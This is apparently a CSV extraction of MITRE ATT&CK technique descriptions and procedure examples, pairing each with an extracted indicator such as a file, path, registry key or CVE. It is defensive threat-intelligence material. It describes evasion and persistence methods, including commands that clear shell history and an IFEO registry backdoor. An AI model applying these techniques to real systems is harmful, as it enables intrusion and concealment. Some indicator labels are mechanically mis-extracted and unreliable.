T1564.001,Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches ( dir /a  for Windows and  ls –a  for Linux and macOS).   On Linux and Mac, users can mark specific files as hidden simply by putting a ""."" as the first character in the file or folder name     [1]       [2]   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like ""ls"". Users must specifically change settings to have these files viewable.   Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app    [3]   . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.   Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",Description,domain,terminal.app
T1564.001,Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches ( dir /a  for Windows and  ls –a  for Linux and macOS).   On Linux and Mac, users can mark specific files as hidden simply by putting a ""."" as the first character in the file or folder name     [1]       [2]   . Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like ""ls"". Users must specifically change settings to have these files viewable.   Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app    [3]   . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.   Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",Description,file,attrib.exe
T1564.001,Hidden Files and Directories,"CoinTicker  downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].   [15]",Procedure Examples,domain,info.py
T1564.001,Hidden Files and Directories,"CoinTicker  downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].   [15]",Procedure Examples,domain,server.sh
T1564.001,Hidden Files and Directories,"CoinTicker  downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].   [15]",Procedure Examples,path,/private/tmp/.info
T1564.001,Hidden Files and Directories,"CoinTicker  downloads the following hidden files to evade detection and maintain persistence: /private/tmp/.info.enc, /private/tmp/.info.py, /private/tmp/.server.sh, ~/Library/LaunchAgents/.espl.plist, ~/Library/Containers/.[random string]/[random string].   [15]",Procedure Examples,path,~/Library/LaunchAgents/.espl
T1564.001,Hidden Files and Directories,The  Komplex  payload is stored in a hidden directory at  /Users/Shared/.local/kextd .   [1],Procedure Examples,path,/Users/Shared/.local
T1564.001,Hidden Files and Directories,MacSpy  stores itself in  ~/Library/.DS_Stores/     [29],Procedure Examples,path,~/Library/.DS
T1564.001,Hidden Files and Directories,Tropic Trooper  has created a hidden directory under  C:\ProgramData\Apple\Updates\  and  C:\Users\Public\Documents\Flash\ .   [46]      [47],Procedure Examples,path,C:\ProgramData\Apple\Updates
T1564.001,Hidden Files and Directories,Tropic Trooper  has created a hidden directory under  C:\ProgramData\Apple\Updates\  and  C:\Users\Public\Documents\Flash\ .   [46]      [47],Procedure Examples,path,C:\Users\Public\Documents\Flash
T1001.001,Junk Data,Mori  has obfuscated the FML.dll with 200MB of junk data.   [7],Procedure Examples,file,FML.dll
T1574.007,Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.   The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\system32  (e.g.,  C:\Windows\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.   For example, if  C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in  C:\example path  will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",Description,path,"C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe"
T1574.007,Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.   The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\system32  (e.g.,  C:\Windows\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.   For example, if  C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in  C:\example path  will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",Description,file,cmd.exe
T1574.007,Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.   The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\system32  (e.g.,  C:\Windows\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.   For example, if  C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in  C:\example path  will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",Description,file,net.exe
T1574.007,Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.   The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\system32  (e.g.,  C:\Windows\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.   For example, if  C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in  C:\example path  will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",Description,path,C:\Windows\system32
T1574.007,Path Interception by PATH Environment Variable,"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.   The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory,  %SystemRoot%\system32  (e.g.,  C:\Windows\system32 ), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.   For example, if  C:\example path  precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in  C:\example path  will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.",Description,path,C:\example
T1070.006,Timestomp,"APT32  has used scheduled task raw XML with a backdated timestamp of June 2, 2016. The group has also set the creation time of the files dropped by the second stage of the exploit to match the creation time of kernel32.dll. Additionally,  APT32  has used a random value to modify the timestamp of the file storing the clientID.   [5]      [6]      [7]",Procedure Examples,file,kernel32.dll
T1070.006,Timestomp,"Several  Lazarus Group  malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.   [33]      [34]      [35]      [36]",Procedure Examples,file,calc.exe
T1070.006,Timestomp,"Several  Lazarus Group  malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.   [33]      [34]      [35]      [36]",Procedure Examples,file,mspaint.exe
T1070.006,Timestomp,"After creating a new service for persistence,  TDTESS  sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.   [51]",Procedure Examples,file,svchost.exe
T1070.006,Timestomp,Winnti for Windows  can set the timestamps for its worker and service components to match that of cmd.exe.   [54],Procedure Examples,file,cmd.exe
T1068,Exploitation for Privilege Escalation,"APT28  has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.   [3]      [4]      [5]",Procedure Examples,cve,CVE-2015-1701
T1068,Exploitation for Privilege Escalation,"APT28  has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.   [3]      [4]      [5]",Procedure Examples,cve,CVE-2017-0263
T1068,Exploitation for Privilege Escalation,"APT28  has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.   [3]      [4]      [5]",Procedure Examples,cve,CVE-2014-4076
T1068,Exploitation for Privilege Escalation,"APT28  has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263 to escalate privileges.   [3]      [4]      [5]",Procedure Examples,cve,CVE-2015-2387
T1068,Exploitation for Privilege Escalation,APT29  has exploited CVE-2021-36934 to escalate privileges on a compromised host.   [6],Procedure Examples,cve,CVE-2021-36934
T1068,Exploitation for Privilege Escalation,APT32  has used CVE-2016-7255 to escalate privileges.   [7],Procedure Examples,cve,CVE-2016-7255
T1068,Exploitation for Privilege Escalation,APT33  has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.   [8],Procedure Examples,cve,CVE-2017-0213
T1068,Exploitation for Privilege Escalation,BITTER  has exploited CVE-2021-1732 for privilege escalation.   [9]      [10],Procedure Examples,cve,CVE-2021-1732
T1068,Exploitation for Privilege Escalation,"Carberp  has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.   [11]      [12]",Procedure Examples,cve,CVE-2010-3338
T1068,Exploitation for Privilege Escalation,"Carberp  has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.   [11]      [12]",Procedure Examples,cve,CVE-2010-2743
T1068,Exploitation for Privilege Escalation,"Carberp  has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.   [11]      [12]",Procedure Examples,cve,CVE-2008-1084
T1068,Exploitation for Privilege Escalation,"Carberp  has exploited multiple Windows vulnerabilities (CVE-2010-2743, CVE-2010-3338, CVE-2010-4398, CVE-2008-1084) and a .NET Runtime Optimization vulnerability for privilege escalation.   [11]      [12]",Procedure Examples,cve,CVE-2010-4398
T1068,Exploitation for Privilege Escalation,CosmicDuke  attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.   [16],Procedure Examples,cve,CVE-2010-0232
T1068,Exploitation for Privilege Escalation,CosmicDuke  attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.   [16],Procedure Examples,cve,CVE-2010-4398
T1068,Exploitation for Privilege Escalation,"FIN6  has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.   [18]",Procedure Examples,cve,CVE-2010-4398
T1068,Exploitation for Privilege Escalation,"FIN6  has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.   [18]",Procedure Examples,cve,CVE-2013-3660
T1068,Exploitation for Privilege Escalation,"FIN6  has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.   [18]",Procedure Examples,cve,CVE-2011-2005
T1068,Exploitation for Privilege Escalation,FIN8  has exploited the CVE-2016-0167 local vulnerability.   [19]      [20],Procedure Examples,cve,CVE-2016-0167
T1068,Exploitation for Privilege Escalation,Hildegard  has used the BOtB tool which exploits CVE-2019-5736.   [21],Procedure Examples,cve,CVE-2019-5736
T1068,Exploitation for Privilege Escalation,InvisiMole  has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.   [1],Procedure Examples,cve,CVE-2007-5633
T1068,Exploitation for Privilege Escalation,InvisiMole  has exploited CVE-2007-5633 vulnerability in the speedfan.sys driver to obtain kernel mode privileges.   [1],Procedure Examples,file,speedfan.sys
T1068,Exploitation for Privilege Escalation,JHUHUGIT  has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.   [22]      [23],Procedure Examples,cve,CVE-2015-1701
T1068,Exploitation for Privilege Escalation,JHUHUGIT  has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.   [22]      [23],Procedure Examples,cve,CVE-2015-2387
T1068,Exploitation for Privilege Escalation,Pandora  can use CVE-2017-15303 to bypass Windows Driver Signature Enforcement (DSE) protection and load its driver.   [25],Procedure Examples,cve,CVE-2017-15303
T1068,Exploitation for Privilege Escalation,PoshC2  contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.   [27],Procedure Examples,cve,CVE-2016-0099
T1068,Exploitation for Privilege Escalation,PoshC2  contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.   [27],Procedure Examples,cve,CVE-2016-9192
T1068,Exploitation for Privilege Escalation,ProLock  can use CVE-2019-0859 to escalate privileges on a compromised host.   [28],Procedure Examples,cve,CVE-2019-0859
T1068,Exploitation for Privilege Escalation,Threat Group-3390  has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.   [32]      [33],Procedure Examples,cve,CVE-2017-0213
T1068,Exploitation for Privilege Escalation,Threat Group-3390  has used CVE-2014-6324 and CVE-2017-0213 to escalate privileges.   [32]      [33],Procedure Examples,cve,CVE-2014-6324
T1068,Exploitation for Privilege Escalation,Tonto Team  has exploited CVE-2019-0803 and MS16-032 to escalate privileges.   [34],Procedure Examples,cve,CVE-2019-0803
T1068,Exploitation for Privilege Escalation,Turla  has exploited vulnerabilities in the VBoxDrv.sys driver to obtain kernel mode privileges.   [2],Procedure Examples,file,VBoxDrv.sys
T1068,Exploitation for Privilege Escalation,Whitefly  has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers.   [35],Procedure Examples,cve,CVE-2016-0051
T1068,Exploitation for Privilege Escalation,Wingbird  exploits CVE-2016-4117 to allow an executable to gain escalated privileges.   [36],Procedure Examples,cve,CVE-2016-4117
T1068,Exploitation for Privilege Escalation,ZIRCONIUM  has exploited CVE-2017-0005 for local privilege escalation.   [38],Procedure Examples,cve,CVE-2017-0005
T1033,System Owner or User Discovery,"An  APT3  downloader uses the Windows command  ""cmd.exe"" /C whoami  to verify that it is running with the elevated privileges of ""System.""   [8]",Procedure Examples,file,cmd.exe
T1070.003,Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.   On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable  HISTFILE . When a user logs off a system, this information is flushed to a file in the user's home directory called  ~/.bash_history . The benefit of this is that it allows users to go back to commands they've used before in different sessions.   Adversaries may delete their commands from these logs by manually clearing the history ( history -c ) or deleting the bash history file  rm ~/.bash_history .     Adversaries may also leverage a  Network Device CLI  on network devices to clear command history data ( clear logging  and/or  clear history ).   [1]      On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the  PSReadLine  module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.   The  PSReadLine  command history tracks the commands used in all PowerShell sessions and writes them to a file ( $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.   [2]      Adversaries may run the PowerShell command  Clear-History  to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the  ConsoleHost_history.txt  file. Adversaries may also delete the  ConsoleHost_history.txt  file or edit its contents to hide PowerShell commands they have run.   [3]      [4]",Description,path,~/.bash
T1546.012,Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\dbg\ntsd.exe -g  notepad.exe ).    [1]      IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.    [2]    IFEOs are represented as  Debugger  values in the Registry under  HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\    where  &lt;executable&gt;  is the binary on which the debugger is attached.    [1]      IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).    [3]       [4]    Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ .    [3]       [4]      Similar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol  will cause the ""debugger"" program to be executed with SYSTEM privileges.    [5]      Similar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.    [6]    Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.   Malware may also use IFEO to  Impair Defenses  by registering invalid debuggers that redirect and effectively disable various system and security applications.    [7]       [8]",Description,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
T1546.012,Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\dbg\ntsd.exe -g  notepad.exe ).    [1]      IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.    [2]    IFEOs are represented as  Debugger  values in the Registry under  HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\    where  &lt;executable&gt;  is the binary on which the debugger is attached.    [1]      IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).    [3]       [4]    Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ .    [3]       [4]      Similar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol  will cause the ""debugger"" program to be executed with SYSTEM privileges.    [5]      Similar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.    [6]    Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.   Malware may also use IFEO to  Impair Defenses  by registering invalid debuggers that redirect and effectively disable various system and security applications.    [7]       [8]",Description,registry-key,HKLM\SOFTWARE
T1546.012,Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\dbg\ntsd.exe -g  notepad.exe ).    [1]      IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.    [2]    IFEOs are represented as  Debugger  values in the Registry under  HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\    where  &lt;executable&gt;  is the binary on which the debugger is attached.    [1]      IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).    [3]       [4]    Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ .    [3]       [4]      Similar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol  will cause the ""debugger"" program to be executed with SYSTEM privileges.    [5]      Similar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.    [6]    Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.   Malware may also use IFEO to  Impair Defenses  by registering invalid debuggers that redirect and effectively disable various system and security applications.    [7]       [8]",Description,path,C:\dbg\ntsd.exe
T1546.012,Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\dbg\ntsd.exe -g  notepad.exe ).    [1]      IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.    [2]    IFEOs are represented as  Debugger  values in the Registry under  HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\    where  &lt;executable&gt;  is the binary on which the debugger is attached.    [1]      IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).    [3]       [4]    Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ .    [3]       [4]      Similar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol  will cause the ""debugger"" program to be executed with SYSTEM privileges.    [5]      Similar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.    [6]    Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.   Malware may also use IFEO to  Impair Defenses  by registering invalid debuggers that redirect and effectively disable various system and security applications.    [7]       [8]",Description,file,ntsd.exe
T1546.012,Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\dbg\ntsd.exe -g  notepad.exe ).    [1]      IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.    [2]    IFEOs are represented as  Debugger  values in the Registry under  HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\    where  &lt;executable&gt;  is the binary on which the debugger is attached.    [1]      IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).    [3]       [4]    Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ .    [3]       [4]      Similar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol  will cause the ""debugger"" program to be executed with SYSTEM privileges.    [5]      Similar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.    [6]    Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.   Malware may also use IFEO to  Impair Defenses  by registering invalid debuggers that redirect and effectively disable various system and security applications.    [7]       [8]",Description,file,notepad.exe
T1546.012,Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\dbg\ntsd.exe -g  notepad.exe ).    [1]      IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.    [2]    IFEOs are represented as  Debugger  values in the Registry under  HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\    where  &lt;executable&gt;  is the binary on which the debugger is attached.    [1]      IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).    [3]       [4]    Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ .    [3]       [4]      Similar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol  will cause the ""debugger"" program to be executed with SYSTEM privileges.    [5]      Similar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.    [6]    Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.   Malware may also use IFEO to  Impair Defenses  by registering invalid debuggers that redirect and effectively disable various system and security applications.    [7]       [8]",Description,file,cmd.exe
T1546.012,Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,  C:\dbg\ntsd.exe -g  notepad.exe ).    [1]      IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.    [2]    IFEOs are represented as  Debugger  values in the Registry under  HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\    where  &lt;executable&gt;  is the binary on which the debugger is attached.    [1]      IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).    [3]       [4]    Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\ .    [3]       [4]      Similar to  Accessibility Features , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  Remote Desktop Protocol  will cause the ""debugger"" program to be executed with SYSTEM privileges.    [5]      Similar to  Process Injection , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.    [6]    Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.   Malware may also use IFEO to  Impair Defenses  by registering invalid debuggers that redirect and effectively disable various system and security applications.    [7]       [8]",Description,file,utilman.exe
